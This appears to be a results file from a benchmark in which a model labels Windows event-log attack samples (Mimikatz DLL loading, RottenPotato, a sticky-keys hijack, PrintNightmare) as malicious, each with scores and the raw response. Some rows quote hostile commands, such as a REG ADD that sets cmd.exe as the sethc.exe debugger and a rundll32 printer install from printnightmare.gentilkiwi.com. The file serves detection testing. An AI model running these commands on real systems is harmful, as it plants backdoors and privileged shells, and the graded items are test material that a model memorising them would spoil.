# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
gpt-5.5-2026-04-23,ID770-Success DLL loaded by DNS server.evtx,easy,A,processed,YES,100.0,100.0,YES,"771, 770",C:\TOOLS\Mimikatz-fev-2020\mimilib.dll,,,rootdc1.offsec.lan,,0.0,16.75,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 771, 770
- Processes: C:\TOOLS\Mimikatz-fev-2020\mimilib.dll
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The DNS Server Service logged events 771 and 770 with a DLL path of C:\TOOLS\Mimikatz-fev-2020\mimilib.dll on rootdc1.offsec.lan. A Mimikatz mimilib.dll path associated with the DNS Server Service indicates malicious attack behavior rather than routine DNS activity."
gpt-5.5-2026-04-23,ID4673-Privilege SeMachineAccountPrivilege called.evtx,easy,A,processed,NO,100.0,100.0,YES,4673,C:\Windows\System32\lsass.exe,hack1,,rootdc1.offsec.lan,,0.0,13.24,6.0,1.0,4.0,3,14.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4673
- Processes: C:\Windows\System32\lsass.exe
- Accounts: hack1
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The event shows account hack1 using SeMachineAccountPrivilege through C:\Windows\System32\lsass.exe against the Security Account Manager. In isolation, there are no commands, registry changes, network connections, or related follow-on events showing account creation or privilege escalation, so the log does not prove malicious activity by itself."
gpt-5.5-2026-04-23,ID4648-4624-RunAsCS login.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4648, 4624, 4688","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe","admmig, test10, FS03$","/c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami","FS03.offsec.lan, localhost, FS03",,0.0,12.71,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4648, 4624, 4688
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe
- Accounts: admmig, test10, FS03$
- Commands: /c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami
- Network: FS03.offsec.lan, localhost, FS03
- Registry: None

EXPLANATION:
The logs show Security event log clearing with Event ID 1102 followed immediately by explicit credential use from admmig to test10 through C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe. The same sequence creates cmd.exe and whoami.exe processes under test10, indicating suspicious post-log-clear command execution rather than routine activity."
gpt-5.5-2026-04-23,"ID4688,4624-RottenPotatoNG.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4624","C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","hack1, ANONYMOUS LOGON, FS03VULN$","MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff","fs03vuln.offsec.lan, 127.0.0.1",,0.0,9.54,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4624
- Processes: C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
- Accounts: hack1, ANONYMOUS LOGON, FS03VULN$
- Commands: MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: fs03vuln.offsec.lan, 127.0.0.1
- Registry: None

EXPLANATION:
The logs show Security event log clearing followed immediately by execution of C:\TOOLS\MSFRottenPotato.exe by hack1. This is followed by an NTLM anonymous logon from 127.0.0.1 and SYSTEM-level creation of cmd.exe and conhost.exe under FS03VULN$, indicating attack behavior rather than routine activity."
gpt-5.5-2026-04-23,"ID4688,4648,4624-Runas execution with different user.evtx",easy,A,processed,YES,100.0,95.0,YES,"1102, 4688, 4648, 4624, 4672","C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe","admmig, hack1, FS03$","runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe","FS03.offsec.lan, localhost, ::1, FS03",,0.0,15.44,5.7,6.0,4.0,4,19.7,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4648, 4624, 4672
- Processes: C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe
- Accounts: admmig, hack1, FS03$
- Commands: runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe
- Network: FS03.offsec.lan, localhost, ::1, FS03
- Registry: None

EXPLANATION:
Event ID 1102 shows the Security log was cleared, followed immediately by admmig using runas to start cmd.exe as hack1. The hack1 account then received special privileges in Event ID 4672 and launched cmd.exe, conhost.exe, and ctfmon.exe, forming a suspicious privilege and process execution chain."
gpt-5.5-2026-04-23,ID4704-4705-User righ assigned to account.evtx,easy,A,processed,YES,100.0,100.0,YES,"4704, 4705",,admmig,,fs02.offsec.lan,,0.0,8.54,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4704, 4705
- Processes: None
- Accounts: admmig
- Commands: None
- Network: fs02.offsec.lan
- Registry: None

EXPLANATION:
The logs show repeated paired 4704 and 4705 events by admmig on fs02.offsec.lan, rapidly assigning and removing sensitive privileges including SeCreateTokenPrivilege, SeAssignPrimaryTokenPrivilege, SeDebugPrivilege, and SeImpersonatePrivilege. This pattern of temporary privilege changes on the same target identifier is consistent with suspicious privilege manipulation rather than routine benign activity."
gpt-5.5-2026-04-23,ID4717-4718-System security granded to account.evtx,easy,A,processed,YES,100.0,100.0,YES,"4717, 4718",,admmig,,fs02.offsec.lan,,0.0,15.41,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4717, 4718
- Processes: None
- Accounts: admmig
- Commands: None
- Network: fs02.offsec.lan
- Registry: None

EXPLANATION:
The same account, admmig, granted and then removed SeDenyServiceLogonRight on the same TargetSid within a short time window. This paired state change on the same identifier indicates suspicious manipulation of logon rights rather than a standalone benign administrative event."
gpt-5.5-2026-04-23,ID 4765 - SID history added.evtx,easy,A,processed,YES,100.0,75.0,YES,"4661, 4765, 4658",C:\Windows\System32\lsass.exe,"Administrator, maincorp.local\Domain Admins, Andrei",,2012r2srv.maincorp.local,,0.0,11.08,4.5,6.0,4.0,3,17.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4661, 4765, 4658
- Processes: C:\Windows\System32\lsass.exe
- Accounts: Administrator, maincorp.local\Domain Admins, Andrei
- Commands: None
- Network: 2012r2srv.maincorp.local
- Registry: None

EXPLANATION:
Event ID 4765 shows maincorp.local\Domain Admins associated with TargetUserName Andrei, performed by Administrator. The surrounding 4661 and 4658 events show Security Account Manager access and handle closure by C:\Windows\System32\lsass.exe under the same SubjectLogonId, forming a suspicious account modification sequence."
gpt-5.5-2026-04-23,ID 4865 4706 - trust added.evtx,easy,A,processed,YES,100.0,100.0,YES,"4741, 4742, 4706, 4865",,"ROOTBLUE$, Administrator",,"CDCWTRDC01.mypartner.lan, rootblue.lan, child.rootblue.lan",,0.0,13.67,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4741, 4742, 4706, 4865
- Processes: None
- Accounts: ROOTBLUE$, Administrator
- Commands: None
- Network: CDCWTRDC01.mypartner.lan, rootblue.lan, child.rootblue.lan
- Registry: None

EXPLANATION:
The events show Administrator created and modified ROOTBLUE$ and then created a trusted domain object for rootblue.lan, followed immediately by forest trust information entries for rootblue.lan and child.rootblue.lan. The coordinated account changes and new trust configuration in the same sequence indicate malicious attack behavior rather than a benign isolated event."
gpt-5.5-2026-04-23,ID5136-4662 sensitive GPO edited.evtx,easy,A,processed,NO,100.0,43.8,YES,"4662, 5136",,"admmig, FS02$, ROOTDC1$",,"rootdc1.offsec.lan, offsec.lan",,0.0,13.42,2.6,1.0,4.0,1,8.6,D,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4662, 5136
- Processes: None
- Accounts: admmig, FS02$, ROOTDC1$
- Commands: None
- Network: rootdc1.offsec.lan, offsec.lan
- Registry: None

EXPLANATION:
The logs show directory object access events and a groupPolicyContainer versionNumber change by admmig, followed by machine account object access from FS02$ and ROOTDC1$. There are no process executions, command lines, registry changes, or explicit malicious indicators in the provided event data to confirm attack behavior."
gpt-5.5-2026-04-23,ID1-CMD executed via sticky key call.evtx,easy,A,processed,YES,100.0,100.0,YES,"1, 18","C:\Windows\System32\cmd.exe, C:\Windows\System32\winlogon.exe, C:\Windows\system32\mmc.exe",OFFSEC\admmig,"C:\windows\system32\cmd.exe sethc.exe 211, winlogon.exe",win10-02.offsec.lan,,0.0,12.91,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1, 18
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\winlogon.exe, C:\Windows\system32\mmc.exe
- Accounts: OFFSEC\admmig
- Commands: C:\windows\system32\cmd.exe sethc.exe 211, winlogon.exe
- Network: win10-02.offsec.lan
- Registry: None

EXPLANATION:
The process C:\Windows\System32\cmd.exe was launched by C:\Windows\System32\winlogon.exe with the command line C:\windows\system32\cmd.exe sethc.exe 211, which is suspicious because it indicates cmd.exe being invoked in place of sethc.exe from the logon context. The subsequent Sysmon pipe connection event involving \srvsvc by C:\Windows\system32\mmc.exe adds related administrative activity shortly afterward, supporting malicious attack behavior rather than routine activity."
gpt-5.5-2026-04-23,ID11-New sethc file created from CMD copy.evtx,easy,A,processed,YES,100.0,100.0,YES,11,"C:\Windows\system32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\seth2c.exe, C:\Windows\System32\sethc.exe",,,fs02.offsec.lan,,0.0,12.49,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 11
- Processes: C:\Windows\system32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\seth2c.exe, C:\Windows\System32\sethc.exe
- Accounts: None
- Commands: None
- Network: fs02.offsec.lan
- Registry: None

EXPLANATION:
The events show cmd.exe creating C:\Windows\System32\seth2c.exe followed shortly by powershell.exe creating C:\Windows\System32\sethc.exe. This pattern of modifying similarly named executables in System32 is suspicious and indicates likely system binary tampering rather than routine activity."
gpt-5.5-2026-04-23,"ID12,13-Stickey key registry update.evtx",easy,A,processed,YES,100.0,91.7,YES,"12, 13","C:\Windows\system32\reg.exe, C:\windows\system32\cmd.exe",,,srvdefender01.offsec.lan,"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe, HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger",0.0,7.21,5.5,6.0,4.0,4,19.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 12, 13
- Processes: C:\Windows\system32\reg.exe, C:\windows\system32\cmd.exe
- Accounts: None
- Commands: None
- Network: srvdefender01.offsec.lan
- Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe, HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger

EXPLANATION:
The events show C:\Windows\system32\reg.exe creating an Image File Execution Options key for sethc.exe and setting the Debugger value to C:\windows\system32\cmd.exe. This pattern matches Image File Execution Options Injection and is malicious because it configures sethc.exe to launch cmd.exe through the debugger mechanism."
gpt-5.5-2026-04-23,ID4656-Failed sethc replacement by CMD.evtx,easy,A,processed,YES,100.0,75.0,YES,"1102, 4656","C:\Windows\System32\cmd.exe, C:\Windows\System32\sethc.exe",admmig,,srvdefender01.offsec.lan,,0.0,14.12,4.5,6.0,4.0,3,17.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4656
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\sethc.exe
- Accounts: admmig
- Commands: None
- Network: srvdefender01.offsec.lan
- Registry: None

EXPLANATION:
Event ID 1102 on the Security channel indicates audit log clearing, followed within seconds by repeated Event ID 4656 access attempts by admmig through C:\Windows\System32\cmd.exe against C:\Windows\System32\sethc.exe. The combination of Security log clearing and command-shell access to sethc.exe is suspicious because it matches a pattern of covering tracks and tampering with a Windows accessibility executable."
gpt-5.5-2026-04-23,ID4688-Stickey command reg update + execution.evtx,easy,A,processed,YES,100.0,90.0,YES,4688,"C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\winlogon.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe","admmig, SRVDEFENDER01$","REG  ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /t REG_SZ /v Debugger /d ""C:\windows\system32\cmd.exe"" /f, C:\windows\system32\cmd.exe sethc.exe 211, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""",srvdefender01.offsec.lan,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe,0.0,14.48,5.4,5.0,4.0,3,17.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\winlogon.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe
- Accounts: admmig, SRVDEFENDER01$
- Commands: REG  ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /t REG_SZ /v Debugger /d ""C:\windows\system32\cmd.exe"" /f, C:\windows\system32\cmd.exe sethc.exe 211, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
- Network: srvdefender01.offsec.lan
- Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe

EXPLANATION:
The logs show admmig running REG  ADD to set the Image File Execution Options Debugger value for sethc.exe to C:\windows\system32\cmd.exe. Shortly afterward, winlogon.exe spawned C:\Windows\System32\cmd.exe with the command line C:\windows\system32\cmd.exe sethc.exe 211, matching a sethc.exe debugger hijack pattern."
gpt-5.5-2026-04-23,1-Print spool spawned a CMD shell (PrintNightMare).evtx,easy,A,processed,YES,100.0,100.0,YES,1,"C:\Windows\System32\cmd.exe, C:\Windows\System32\spoolsv.exe",NT AUTHORITY\SYSTEM,"""cmd.exe"", C:\Windows\System32\spoolsv.exe",,,0.0,6.40,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\spoolsv.exe
- Accounts: NT AUTHORITY\SYSTEM
- Commands: ""cmd.exe"", C:\Windows\System32\spoolsv.exe
- Network: None
- Registry: None

EXPLANATION:
The event shows C:\Windows\System32\spoolsv.exe spawning C:\Windows\System32\cmd.exe as NT AUTHORITY\SYSTEM. A command shell launched by the print spooler service under SYSTEM context is suspicious and consistent with attack behavior."
gpt-5.5-2026-04-23,"ID316,300,301,316,823,848-Mimispool printer server instal.evtx",easy,A,processed,NO,100.0,100.0,YES,"823, 302, 849, 301, 316, 848, 300",,,,fs03vuln.offsec.lan,,0.0,26.40,6.0,1.0,4.0,1,12.0,C,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 823, 302, 849, 301, 316, 848, 300
- Processes: None
- Accounts: None
- Commands: None
- Network: fs03vuln.offsec.lan
- Registry: None

EXPLANATION:
The events show a cluster of Microsoft-Windows-PrintService Admin and Operational activity on fs03vuln.offsec.lan, but the EventData fields are empty. There are no accounts, processes, commands, registry paths, or remote network indicators in the provided logs to confirm attack behavior."
gpt-5.5-2026-04-23,ID354-808-Mimispool printer installation (PrintNightmare).evtx,easy,A,processed,NO,100.0,100.0,YES,"316, 300, 304, 306, 354, 823, 808, 302, 301, 317",,,,FS03.offsec.lan,,0.0,6.15,6.0,1.0,4.0,1,12.0,C,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 316, 300, 304, 306, 306, 354, 306, 823, 808, 808, 302, 302, 301, 317
- Processes: None
- Accounts: None
- Commands: None
- Network: FS03.offsec.lan
- Registry: None

EXPLANATION:
The logs show a sequence of Microsoft-Windows-PrintService events on FS03.offsec.lan with no EventData containing processes, accounts, commands, registry paths, or remote network indicators. Based only on the provided data, there is not enough evidence to identify attack behavior."
gpt-5.5-2026-04-23,"ID4688,6416,4648-SystemNightMare.evtx",easy,A,processed,YES,100.0,93.3,YES,"1102, 4688, 4648, 4690, 4658, 4656, 6416","C:\Windows\System32\net.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\rundll32.exe, C:\Windows\System32\spoolsv.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\drvinst.exe, C:\Windows\System32\conhost.exe","admmig, gentilguest, FS01$","net  use \\printnightmare.gentilkiwi.com\ipc$ /user:gentilguest password, rundll32  printui.dll,PrintUIEntry /in /n""\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"", DrvInst.exe ""4"" ""d"" ""C:\Windows\system32\spool\{FB290F8D-907E-440F-B071-82ECFEE67D2B}\ntprint.inf"" ""9"" ""4d2985097"" ""0000000000000AEC"" ""WinSta0\Default"" ""0000000000000D8C"" ""208"" ""C:\Windows\system32\spool\{FB290F8D-907E-440F-B071-82ECFEE67D2B}"", DrvInst.exe ""4"" ""d"" ""C:\Windows\system32\spool\{C3445CE2-E050-40AC-972D-6D9E24646E8F}\prnge001.inf"" ""9"" ""4d6061107"" ""0000000000000F34"" ""WinSta0\Default"" ""0000000000000E50"" ""208"" ""C:\Windows\system32\spool\{C3445CE2-E050-40AC-972D-6D9E24646E8F}"", DrvInst.exe ""1"" ""0"" ""SWD\PRINTENUM\{F98719DA-2EAC-4BAB-B347-A1C4BA29442C}"" """" """" ""4f51462e7"" ""0000000000000000"", ""cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","printnightmare.gentilkiwi.com, 20.188.56.147","\REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates",0.0,25.64,5.6,6.0,4.0,4,19.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4648, 4690, 4658, 4656, 6416
- Processes: C:\Windows\System32\net.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\rundll32.exe, C:\Windows\System32\spoolsv.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\drvinst.exe, C:\Windows\System32\conhost.exe
- Accounts: admmig, gentilguest, FS01$
- Commands: net  use \\printnightmare.gentilkiwi.com\ipc$ /user:gentilguest password, rundll32  printui.dll,PrintUIEntry /in /n""\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"", DrvInst.exe ""4"" ""d"" ""C:\Windows\system32\spool\{FB290F8D-907E-440F-B071-82ECFEE67D2B}\ntprint.inf"" ""9"" ""4d2985097"" ""0000000000000AEC"" ""WinSta0\Default"" ""0000000000000D8C"" ""208"" ""C:\Windows\system32\spool\{FB290F8D-907E-440F-B071-82ECFEE67D2B}"", DrvInst.exe ""4"" ""d"" ""C:\Windows\system32\spool\{C3445CE2-E050-40AC-972D-6D9E24646E8F}\prnge001.inf"" ""9"" ""4d6061107"" ""0000000000000F34"" ""WinSta0\Default"" ""0000000000000E50"" ""208"" ""C:\Windows\system32\spool\{C3445CE2-E050-40AC-972D-6D9E24646E8F}"", DrvInst.exe ""1"" ""0"" ""SWD\PRINTENUM\{F98719DA-2EAC-4BAB-B347-A1C4BA29442C}"" """" """" ""4f51462e7"" ""0000000000000000"", ""cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
- Network: printnightmare.gentilkiwi.com, 20.188.56.147
- Registry: \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates

EXPLANATION:
The sequence shows admmig connecting to \\printnightmare.gentilkiwi.com\ipc$ with gentilguest credentials and using rundll32 printui.dll,PrintUIEntry to add \\printnightmare.gentilkiwi.com\Kiwi Legit Printer. This is followed by driver installation activity under FS01$ and spoolsv.exe spawning ""cmd.exe"" as FS01$, with an EventID 1102 security log clear preceding the activity, indicating malicious PrintNightmare-style exploitation behavior."
